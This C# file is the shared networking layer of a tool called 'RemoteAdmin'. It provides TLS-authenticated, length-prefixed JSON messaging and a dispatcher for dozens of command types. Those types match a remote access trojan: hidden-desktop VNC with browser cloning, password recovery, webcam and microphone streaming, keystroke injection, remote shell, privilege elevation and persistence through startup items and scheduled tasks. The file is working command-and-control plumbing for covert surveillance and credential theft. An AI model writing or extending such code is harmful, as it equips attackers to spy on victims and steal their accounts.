using System;
using System.Collections.Concurrent;
using System.IO;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace RemoteAdmin.Shared
{
    public static class NetworkHelper
    {
        private const int HeaderSize = 4;

        // Semaphore to ensure only one write operation at a time per stream
        private static readonly ConcurrentDictionary<SslStream, SemaphoreSlim> streamLocks
            = new ConcurrentDictionary<SslStream, SemaphoreSlim>();

        private static SemaphoreSlim GetLockForStream(SslStream stream)
        {
            return streamLocks.GetOrAdd(stream, _ => new SemaphoreSlim(1, 1));
        }

        public static async Task SendMessageAsync(SslStream stream, object message)
        {
            var streamLock = GetLockForStream(stream);

            // Wait for our turn to write to the stream
            await streamLock.WaitAsync();

            try
            {
                string json = JsonSerializer.Serialize(message, new JsonSerializerOptions
                {
                    WriteIndented = false
                });

                byte[] jsonBytes = Encoding.UTF8.GetBytes(json);

                byte[] header = BitConverter.GetBytes(jsonBytes.Length);

                await stream.WriteAsync(header, 0, header.Length);

                await stream.WriteAsync(jsonBytes, 0, jsonBytes.Length);
                await stream.FlushAsync();
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to send message: {ex.Message}", ex);
            }
            finally
            {
                // Release the lock so next message can be sent
                streamLock.Release();
            }
        }


        public static async Task<object> ReceiveMessageAsync(SslStream stream)
        {
            try
            {
                // Read header (4 bytes for length)
                byte[] header = new byte[HeaderSize];
                int bytesRead = 0;

                while (bytesRead < HeaderSize)
                {
                    int read = await stream.ReadAsync(header, bytesRead, HeaderSize - bytesRead);
                    if (read == 0)
                        return null;

                    bytesRead += read;
                }

                // Get message length
                int messageLength = BitConverter.ToInt32(header, 0);

                if (messageLength <= 0 || messageLength > 100_000_000) // 100MB sanity check
                {
                    throw new Exception($"Invalid message length: {messageLength}");
                }

                // Read message body
                byte[] messageBytes = new byte[messageLength];
                bytesRead = 0;

                while (bytesRead < messageLength)
                {
                    int read = await stream.ReadAsync(messageBytes, bytesRead, messageLength - bytesRead);
                    if (read == 0)
                        return null;

                    bytesRead += read;
                }

                string json = Encoding.UTF8.GetString(messageBytes);
                return DeserializeMessage(json);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to receive message: {ex.Message}", ex);
            }
        }

        private static object DeserializeMessage(string json)
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            if (!root.TryGetProperty("MessageType", out var typeProperty))
                throw new Exception("Message missing MessageType property");

            string messageType = typeProperty.GetString();

            // Deserialize based on type
            return messageType switch
            {
                "ClientInfo" => JsonSerializer.Deserialize<ClientInfoMessage>(json),
                "Heartbeat" => JsonSerializer.Deserialize<HeartbeatMessage>(json),
                "ShellCommand" => JsonSerializer.Deserialize<ShellCommandMessage>(json),
                "ShellOutput" => JsonSerializer.Deserialize<ShellOutputMessage>(json),
                "PowerCommand" => JsonSerializer.Deserialize<PowerCommandMessage>(json),
                "ProcessListRequest" => JsonSerializer.Deserialize<ProcessListRequestMessage>(json),
                "ProcessListResponse" => JsonSerializer.Deserialize<ProcessListResponseMessage>(json),
                "KillProcess" => JsonSerializer.Deserialize<KillProcessMessage>(json),
                "ServiceListRequest" => JsonSerializer.Deserialize<ServiceListRequestMessage>(json),
                "ServiceListResponse" => JsonSerializer.Deserialize<ServiceListResponseMessage>(json),
                "ServiceControl" => JsonSerializer.Deserialize<ServiceControlMessage>(json),
                "OperationResult" => JsonSerializer.Deserialize<OperationResultMessage>(json),
                "DirectoryListRequest" => JsonSerializer.Deserialize<DirectoryListRequestMessage>(json),
                "DirectoryListResponse" => JsonSerializer.Deserialize<DirectoryListResponseMessage>(json),
                "DownloadFileRequest" => JsonSerializer.Deserialize<DownloadFileRequestMessage>(json),
                "UploadFileStart" => JsonSerializer.Deserialize<UploadFileStartMessage>(json),
                "FileChunk" => JsonSerializer.Deserialize<FileChunkMessage>(json),
                "DeleteFile" => JsonSerializer.Deserialize<DeleteFileMessage>(json),
                "RenameFile" => JsonSerializer.Deserialize<RenameFileMessage>(json),
                "CreateDirectory" => JsonSerializer.Deserialize<CreateDirectoryMessage>(json),
                "StartRemoteDesktop" => JsonSerializer.Deserialize<StartRemoteDesktopMessage>(json),
                "StopRemoteDesktop" => JsonSerializer.Deserialize<StopRemoteDesktopMessage>(json),
                "ScreenFrame" => JsonSerializer.Deserialize<ScreenFrameMessage>(json),
                "MouseInput" => JsonSerializer.Deserialize<MouseInputMessage>(json),
                "KeyboardInput" => JsonSerializer.Deserialize<KeyboardInputMessage>(json),
                "VisitWebsite" => JsonSerializer.Deserialize<VisitWebsiteMessage>(json),
                "WebsiteVisitResult" => JsonSerializer.Deserialize<WebsiteVisitResultMessage>(json),
                "MonitorInfo" => JsonSerializer.Deserialize<MonitorInfoMessage>(json),
                "SelectMonitor" => JsonSerializer.Deserialize<SelectMonitorMessage>(json),
                "OpenRegistryEditor" => JsonSerializer.Deserialize<OpenRegistryEditorMessage>(json),
                "RegistryEnumerate" => JsonSerializer.Deserialize<RegistryEnumerateMessage>(json),
                "RegistryData" => JsonSerializer.Deserialize<RegistryDataMessage>(json),
                "RegistryCreateKey" => JsonSerializer.Deserialize<RegistryCreateKeyMessage>(json),
                "RegistryDeleteKey" => JsonSerializer.Deserialize<RegistryDeleteKeyMessage>(json),
                "RegistrySetValue" => JsonSerializer.Deserialize<RegistrySetValueMessage>(json),
                "RegistryDeleteValue" => JsonSerializer.Deserialize<RegistryDeleteValueMessage>(json),
                "RegistryOperationResult" => JsonSerializer.Deserialize<RegistryOperationResultMessage>(json),
                "Elevate" => JsonSerializer.Deserialize<ElevationRequestMessage>(json),
                "GetStartupItems" => JsonSerializer.Deserialize<GetStartupItemsMessage>(json),
                "GetStartupItemsResponse" => JsonSerializer.Deserialize<GetStartupItemsResponseMessage>(json),
                "AddStartupItem" => JsonSerializer.Deserialize<AddStartupItemMessage>(json),
                "RemoveStartupItem" => JsonSerializer.Deserialize<RemoveStartupItemMessage>(json),
                "StartupItemOperationResponse" => JsonSerializer.Deserialize<StartupItemOperationResponseMessage>(json),
                "GetSystemInfo" => JsonSerializer.Deserialize<GetSystemInfoMessage>(json),
                "GetSystemInfoResponse" => JsonSerializer.Deserialize<GetSystemInfoResponseMessage>(json),
                "DownloadFolderRequest" => JsonSerializer.Deserialize<DownloadFolderRequestMessage>(json),
                "FolderStructure" => JsonSerializer.Deserialize<FolderStructureMessage>(json),
                "FolderFileChunk" => JsonSerializer.Deserialize<FolderFileChunkMessage>(json),
                "GetScheduledTasks" => JsonSerializer.Deserialize<GetScheduledTasksMessage>(json),
                "GetScheduledTasksResponse" => JsonSerializer.Deserialize<GetScheduledTasksResponseMessage>(json),
                "CreateScheduledTask" => JsonSerializer.Deserialize<CreateScheduledTaskMessage>(json),
                "DeleteScheduledTask" => JsonSerializer.Deserialize<DeleteScheduledTaskMessage>(json),
                "ToggleScheduledTask" => JsonSerializer.Deserialize<ToggleScheduledTaskMessage>(json),
                "RunScheduledTask" => JsonSerializer.Deserialize<RunScheduledTaskMessage>(json),
                "ScheduledTaskOperationResponse" => JsonSerializer.Deserialize<ScheduledTaskOperationResponseMessage>(json),
                "ExportScheduledTask" => JsonSerializer.Deserialize<ExportScheduledTaskMessage>(json),
                "ExportScheduledTaskResponse" => JsonSerializer.Deserialize<ExportScheduledTaskResponseMessage>(json),
                "StartHvnc" => JsonSerializer.Deserialize<StartHvncMessage>(json),
                "StopHvnc" => JsonSerializer.Deserialize<StopHvncMessage>(json),
                "HvncFrame" => JsonSerializer.Deserialize<HvncFrameMessage>(json),
                "SetHvncQuality" => JsonSerializer.Deserialize<SetHvncQualityMessage>(json),
                "HvncInput" => JsonSerializer.Deserialize<HvncInputMessage>(json),
                "HvncStartProcess" => JsonSerializer.Deserialize<HvncStartProcessMessage>(json),
                "HvncBrowserClone" => JsonSerializer.Deserialize<HvncBrowserCloneMessage>(json),
                "HvncLaunchBrowser" => JsonSerializer.Deserialize<HvncLaunchBrowserMessage>(json),
                "PasswordRecoveryRequest" => JsonSerializer.Deserialize<PasswordRecoveryRequestMessage>(json),
                "PasswordRecoveryResponse" => JsonSerializer.Deserialize<PasswordRecoveryResponseMessage>(json),
                "StartWebcam" => JsonSerializer.Deserialize<StartWebcamMessage>(json),
                "StopWebcam" => JsonSerializer.Deserialize<StopWebcamMessage>(json),
                "WebcamFrame" => JsonSerializer.Deserialize<WebcamFrameMessage>(json),
                "GetWebcamList" => JsonSerializer.Deserialize<GetWebcamListMessage>(json),
                "WebcamList" => JsonSerializer.Deserialize<WebcamListMessage>(json),
                "StartAudioStream" => JsonSerializer.Deserialize<StartAudioStreamMessage>(json),
                "StopAudioStream" => JsonSerializer.Deserialize<StopAudioStreamMessage>(json),
                "AudioChunk" => JsonSerializer.Deserialize<AudioChunkMessage>(json),
                _ => throw new Exception($"Unknown message type: {messageType}")
            };
        }

        public static async Task<SslStream> CreateServerSslStreamAsync(
            Stream innerStream,
            X509Certificate2 serverCertificate,
            X509Certificate2 caCertificate)
        {
            var sslStream = new SslStream(
                innerStream,
                leaveInnerStreamOpen: false,
                userCertificateValidationCallback: (sender, certificate, chain, errors) =>
                {
                    if (certificate == null)
                    {
                        Console.WriteLine("Client did not provide a certificate");
                        return false;
                    }

                    var customChain = new X509Chain();
                    customChain.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
                    customChain.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
                    customChain.ChainPolicy.ExtraStore.Add(caCertificate);

                    bool isValid = customChain.Build(new X509Certificate2(certificate));

                    if (!isValid)
                    {
                        Console.WriteLine("Client certificate chain validation failed");
                        return false;
                    }

                    var chainRoot = customChain.ChainElements[customChain.ChainElements.Count - 1].Certificate;
                    if (chainRoot.Thumbprint != caCertificate.Thumbprint)
                    {
                        Console.WriteLine("Client certificate not signed by our CA");
                        return false;
                    }

                    Console.WriteLine("Client certificate validated successfully");
                    return true;
                });

            await sslStream.AuthenticateAsServerAsync(
                serverCertificate,
                clientCertificateRequired: true,
                enabledSslProtocols: SslProtocols.Tls12 | SslProtocols.Tls13,
                checkCertificateRevocation: false);

            Console.WriteLine($"TLS established: {sslStream.SslProtocol}");
            Console.WriteLine($"Cipher: {sslStream.CipherAlgorithm} ({sslStream.CipherStrength} bits)");

            return sslStream;
        }

        public static async Task<SslStream> CreateClientSslStreamAsync(
            Stream innerStream,
            X509Certificate2 clientCertificate,
            X509Certificate2 caCertificate,
            string serverHostname = "RemoteAdmin Server")
        {
            var sslStream = new SslStream(
                innerStream,
                leaveInnerStreamOpen: false,
                userCertificateValidationCallback: (sender, certificate, chain, errors) =>
                {
                    if (certificate == null)
                    {
                        Console.WriteLine("Server did not provide a certificate");
                        return false;
                    }

                    var customChain = new X509Chain();
                    customChain.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
                    customChain.ChainPolicy.VerificationFlags = X509VerificationFlags.AllowUnknownCertificateAuthority;
                    customChain.ChainPolicy.ExtraStore.Add(caCertificate);

                    bool isValid = customChain.Build(new X509Certificate2(certificate));

                    if (!isValid)
                    {
                        Console.WriteLine("Server certificate chain validation failed");
                        return false;
                    }

                    var chainRoot = customChain.ChainElements[customChain.ChainElements.Count - 1].Certificate;
                    if (chainRoot.Thumbprint != caCertificate.Thumbprint)
                    {
                        Console.WriteLine("Server certificate not signed by our CA");
                        return false;
                    }

                    Console.WriteLine("Server certificate validated successfully");
                    return true;
                },
                userCertificateSelectionCallback: (sender, targetHost, localCertificates, remoteCertificate, acceptableIssuers) =>
                {
                    return clientCertificate;
                });

            // Authenticate as client
            var clientCertCollection = new X509CertificateCollection { clientCertificate };

            await sslStream.AuthenticateAsClientAsync(
                serverHostname,
                clientCertCollection,
                SslProtocols.Tls12 | SslProtocols.Tls13,
                checkCertificateRevocation: false);

            Console.WriteLine($"TLS established: {sslStream.SslProtocol}");
            Console.WriteLine($"Cipher: {sslStream.CipherAlgorithm} ({sslStream.CipherStrength} bits)");

            return sslStream;
        }

        // Cleanup method to remove lock when stream is closed
        public static void RemoveStreamLock(SslStream stream)
        {
            if (streamLocks.TryRemove(stream, out var semaphore))
            {
                semaphore?.Dispose();
            }
        }
    }
}